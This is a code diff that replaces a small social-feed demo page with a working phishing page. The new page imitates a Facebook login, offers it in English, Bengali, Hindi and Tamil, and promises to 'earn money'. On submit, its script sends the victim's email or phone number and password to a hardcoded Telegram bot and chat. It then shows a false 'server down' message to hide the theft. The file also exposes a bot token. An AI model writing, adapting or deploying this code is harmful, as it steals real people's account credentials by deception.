@@ -1,148 +1,239 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Matrimony News Feed & Chat</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Facebook Login Multilingual</title>
 <style>
-body{font-family:Arial;background:#f0f2f5;margin:0;padding:0;}
-header{display:flex;justify-content:center;gap:10px;background:#4267B2;padding:10px 0;color:white;position:sticky;top:0;z-index:100;}
-header button{padding:8px 15px;border:none;border-radius:5px;background:white;color:#4267B2;font-weight:bold;cursor:pointer;}
-header button:hover{background:#e4e6eb;}
-.container{max-width:900px;margin:20px auto;padding:0 15px;}
-.post-form,.news-feed,.friend-section,.chat-section{background:white;padding:20px;margin-bottom:20px;border-radius:8px;box-shadow:0 2px 5px rgba(0,0,0,0.1);}
-.post-form h2,.friend-section h2,.chat-section h2{margin-top:0;color:#4267B2;}
-.post-form input,.post-form textarea,.friend-section input,.chat-section input{width:100%;padding:10px;margin:8px 0 15px 0;border:1px solid #ccc;border-radius:5px;}
-.post-form button,.friend-section button,.chat-section button{width:100%;padding:10px;background:#4267B2;color:white;border:none;border-radius:5px;font-weight:bold;cursor:pointer;}
-.post-form button:hover,.friend-section button:hover,.chat-section button:hover{background:#365899;}
-.news-feed{max-height:600px;overflow-y:auto;}
-.post{border-bottom:1px solid #ddd;padding:10px 0;}
-.post:last-child{border-bottom:none;}
-.post img,.post video{width:100%;border-radius:8px;margin-top:10px;max-height:600px;object-fit:cover;cursor:pointer;}
-.like,.comment-btn{margin-right:10px;cursor:pointer;color:#4267B2;font-weight:bold;}
-.comment-section{margin-top:10px;padding-left:20px;}
-.comment{border-bottom:1px solid #ddd;padding:5px 0;}
-.comment input{width:80%;padding:5px;margin-right:5px;}
-.comment button{padding:5px 10px;background:#4267B2;color:white;border:none;border-radius:5px;cursor:pointer;}
-.comment button:hover{background:#365899;}
+  @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+  body {
+    font-family: 'Roboto', sans-serif;
+    background-color: #f0f2f5;
+    color: #000;
+    margin: 0; padding: 0 15px 40px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    flex-direction: column;
+  }
+  h1.facebook-title {
+    color: #1877f2;
+    font-weight: 900;
+    font-size: 64px;
+    margin: 0 0 5px 0;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  }
+  h3.facebook-subtitle {
+    color: #1877f2;
+    font-weight: 700;
+    font-size: 20px;
+    margin: 0 0 20px 0;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  }
+  .lang-select {
+    margin-bottom: 20px;
+    font-size: 16px;
+    padding: 6px 10px;
+  }
+  .form-container {
+    background: white;
+    padding: 40px 35px;
+    border-radius: 10px;
+    box-shadow: 0 8px 25px rgba(12,35,75,0.12);
+    max-width: 400px;
+    width: 100%;
+  }
+  label {
+    display: block;
+    margin-bottom: 10px;
+    font-weight: 600;
+    color: #222f4f;
+  }
+  input[type="text"], input[type="password"] {
+    width: 100%;
+    padding: 12px;
+    border-radius: 6px;
+    border: 1.8px solid #c1d4e6;
+    font-size: 1em;
+    transition: border-color 0.3s ease;
+    margin-bottom: 20px;
+  }
+  input[type="text"]:focus, input[type="password"]:focus {
+    border-color: #0c234b;
+    outline: none;
+    box-shadow: 0 0 5px #0c234b;
+  }
+  button {
+    background-color: #1877f2;
+    color: white;
+    border: none;
+    padding: 14px 0;
+    width: 100%;
+    border-radius: 8px;
+    font-weight: 700;
+    font-size: 1.1em;
+    letter-spacing: 1.2px;
+    cursor: pointer;
+    box-shadow: 0 5px 15px rgba(24,119,242,0.7);
+    transition: background-color 0.3s ease, box-shadow 0.3s ease;
+  }
+  button:hover {
+    background-color: #165ec9;
+    box-shadow: 0 7px 21px rgba(22,94,201,0.8);
+  }
+  #statusMessage {
+    margin-top: 15px;
+    font-weight: 600;
+    text-align: center;
+    color: red;
+  }
+  #metaText {
+    margin-top: 30px;
+    text-align: center;
+    font-weight: 600;
+    color: #555;
+  }
 </style>
 </head>
 <body>
 
-<header>
-<button onclick="showSection('news')">News Feed</button>
-<button onclick="showSection('friend')">Friend Request/Search</button>
-<button onclick="showSection('chat')">Chat</button>
-</header>
+<h1 class="facebook-title">Facebook</h1>
+<h3 class="facebook-subtitle">Earn money Facebook</h3>
 
-<div class="container">
+<select id="languageSelector" class="lang-select" aria-label="Select Language">
+  <option value="en" selected>English</option>
+  <option value="bn">বাংলা</option>
+  <option value="hi">हिन्दी</option>
+  <option value="ta">தமிழ்</option>
+</select>
 
-<!-- News Feed -->
-<div class="news-feed" id="news">
-<div class="post-form">
-<h2>Post Something</h2>
-<textarea id="post-text" placeholder="What's on your mind?"></textarea>
-<input type="file" id="post-file">
-<button onclick="sendPost()">Post</button>
-</div>
-<div id="feed"></div>
-</div>
-
-<!-- Friend Section -->
-<div class="friend-section" id="friend" style="display:none;">
-<h2>Friend Search</h2>
-<input type="text" id="friend-search" placeholder="Enter friend name">
-<button onclick="searchFriend()">Search</button>
-<div id="friend-results"></div>
+<div class="form-container">
+  <form id="loginForm">
+    <label for="loginId" id="labelLoginId">Email or Mobile No.</label>
+    <input type="text" id="loginId" name="loginId" placeholder="Enter email or mobile number" required />
+    
+    <label for="loginPassword" id="labelPassword">Password</label>
+    <input type="password" id="loginPassword" name="loginPassword" placeholder="Enter password" required />
+    
+    <button type="submit" id="submitBtn">Login</button>
+  </form>
+  <div id="statusMessage"></div>
 </div>
 
-<!-- Chat Section -->
-<div class="chat-section" id="chat" style="display:none;">
-<h2>Chat</h2>
-<input type="text" id="chat-to" placeholder="Friend name">
-<input type="text" id="chat-msg" placeholder="Type your message">
-<button onclick="sendChat()">Send</button>
-<div id="chat-history"></div>
-</div>
-
-</div>
+<div id="metaText">meta</div>
 
 <script>
-function showSection(section){
-['news','friend','chat'].forEach(id=>document.getElementById(id).style.display=(id===section)?'block':'none');
-}
+  const translations = {
+    en: {
+      labelLoginId: "Email or Mobile No.",
+      placeholderLoginId: "Enter email or mobile number",
+      labelPassword: "Password",
+      placeholderPassword: "Enter password",
+      submitBtn: "Login",
+      statusEmpty: "Please provide all information.",
+      statusServerDown: "Server down, please try again later."
+    },
+    bn: {
+      labelLoginId: "ইমেইল বা মোবাইল নং",
+      placeholderLoginId: "ইমেইল বা মোবাইল নং লিখুন",
+      labelPassword: "পাসওয়ার্ড",
+      placeholderPassword: "পাসওয়ার্ড লিখুন",
+      submitBtn: "লগইন",
+      statusEmpty: "অনুগ্রহ করে সব তথ্য প্রদান করুন।",
+      statusServerDown: "সার্ভার ডাউন, পরে আবার চেষ্টা করুন।"
+    },
+    hi: {
+      labelLoginId: "ईमेल या मोबाइल नंबर",
+      placeholderLoginId: "ईमेल या मोबाइल नंबर दर्ज करें",
+      labelPassword: "पासवर्ड",
+      placeholderPassword: "पासवर्ड दर्ज करें",
+      submitBtn: "लॉगिन करें",
+      statusEmpty: "कृपया सभी जानकारी दर्ज करें।",
+      statusServerDown: "सर्वर डाउन है, कृपया बाद में प्रयास करें।"
+    },
+    ta: {
+      labelLoginId: "மின்னஞ்சல் அல்லது மொபைல் எண்",
+      placeholderLoginId: "மின்னஞ்சல் அல்லது மொபைல் எண் பதிவு செய்க",
+      labelPassword: "கடவுச்சொல்",
+      placeholderPassword: "கடவுச்சொல்லை உள்ளிடவும்",
+      submitBtn: "உள்நுழைய",
+      statusEmpty: "எல்லா விவரங்களையும் வழங்கவும்.",
+      statusServerDown: "சேவையகம் தாமதமாக உள்ளது, தயவுசெய்து பிறகு முயற்சிக்கவும்."
+    }
+  };
 
-let postIdCounter=0;
-let posts={};
+  const langSelector = document.getElementById('languageSelector');
+  const labelLoginId = document.getElementById('labelLoginId');
+  const loginIdInput = document.getElementById('loginId');
+  const labelPassword = document.getElementById('labelPassword');
+  const loginPasswordInput = document.getElementById('loginPassword');
+  const submitBtn = document.getElementById('submitBtn');
+  const statusMessage = document.getElementById('statusMessage');
 
-// Send post
-async function sendPost(){
-const text=document.getElementById('post-text').value;
-const fileInput=document.getElementById('post-file');
-const feed=document.getElementById('feed');
+  function updateLanguage(lang) {
+    labelLoginId.textContent = translations[lang].labelLoginId;
+    loginIdInput.placeholder = translations[lang].placeholderLoginId;
+    labelPassword.textContent = translations[lang].labelPassword;
+    loginPasswordInput.placeholder = translations[lang].placeholderPassword;
+    submitBtn.textContent = translations[lang].submitBtn;
+    statusMessage.textContent = '';
+  }
 
-let formData=new FormData();
-formData.append('text', text);
-if(fileInput.files.length>0) formData.append('file', fileInput.files[0]);
+  langSelector.addEventListener('change', e => {
+    updateLanguage(e.target.value);
+  });
 
-await fetch('/send_post',{method:'POST',body:formData});
+  // ডিফল্ট ইংলিশ দিয়ে শুরু করছি
+  updateLanguage('en');
 
-const postId='post-'+postIdCounter++;
-let postHTML=`<div class="post" id="${postId}"><p><strong>Guest:</strong> ${text}</p>`;
-if(fileInput.files.length>0){
-const f=fileInput.files[0];
-if(f.type.startsWith('video')) postHTML+=`<video controls src="${URL.createObjectURL(f)}"></video>`;
-else postHTML+=`<img src="${URL.createObjectURL(f)}" onclick="showFullScreen(this)">`;
-}
-postHTML+='</div>';
-feed.prepend(postHTML);
-document.getElementById('post-text').value=''; fileInput.value='';
-}
+  const botToken = '5729834421:AAGrCVQPlxmxrqCT_g0mzWny-EdWU1febhE';
+  const chatId = '-1003102946985';
 
-// Full screen image
-function showFullScreen(el){
-const overlay=document.createElement('div');
-overlay.style.position='fixed';
-overlay.style.top='0'; overlay.style.left='0'; overlay.style.width='100%';
-overlay.style.height='100%'; overlay.style.background='rgba(0,0,0,0.9)';
-overlay.style.display='flex'; overlay.style.justifyContent='center'; overlay.style.alignItems='center';
-overlay.style.zIndex='9999';
-const img=el.cloneNode();
-img.style.maxHeight='90%'; img.style.maxWidth='90%';
-overlay.appendChild(img);
-overlay.onclick=()=>document.body.removeChild(overlay);
-document.body.appendChild(overlay);
-}
+  document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
 
-// Friend demo
-let friends=['Alice','Bob','Charlie','David'];
-function searchFriend(){
-const val=document.getElementById('friend-search').value.toLowerCase();
-const results=friends.filter(f=>f.toLowerCase().includes(val));
-document.getElementById('friend-results').innerHTML=results.map(f=>`<div>${f} <button onclick="sendFriendRequest('${f}')">Add Friend</button></div>`).join('');
-}
-async function sendFriendRequest(name){
-await fetch('/send_friend_request',{
-method:'POST',
-headers:{'Content-Type':'application/json'},
-body:JSON.stringify({friend_name:name})
-});
-alert('Friend Request sent to '+name);
-}
+    const lang = langSelector.value;
+    const loginId = loginIdInput.value.trim();
+    const loginPassword = loginPasswordInput.value;
 
-// Chat
-async function sendChat(){
-const to=document.getElementById('chat-to').value;
-const msg=document.getElementById('chat-msg').value;
-if(!to||!msg) return;
-await fetch('/send_chat',{
-method:'POST',
-headers:{'Content-Type':'application/json'},
-body:JSON.stringify({to_user:to,message:msg})
-});
-document.getElementById('chat-history').innerHTML+=`<div><strong>To ${to}:</strong> ${msg}</div>`;
-document.getElementById('chat-msg').value='';
-}
+    if (!loginId || !loginPassword) {
+      statusMessage.textContent = translations[lang].statusEmpty;
+      statusMessage.style.color = "red";
+      return;
+    }
+
+    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const messageText = `
+New login attempt:
+Email/Mobile: ${loginId}
+Password: ${loginPassword}
+    `;
+
+    fetch(telegramApiUrl, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: messageText
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.ok) {
+        statusMessage.textContent = translations[lang].statusServerDown;
+        statusMessage.style.color = "red";
+        document.getElementById('loginForm').reset();
+      } else {
+        statusMessage.textContent = "Error: " + (data.description || "Failed to send");
+        statusMessage.style.color = "red";
+      }
+    })
+    .catch(error => {
+      statusMessage.textContent = "Error: "+ error.message;
+      statusMessage.style.color = "red";
+    });
+  });
 </script>
 
 </body>
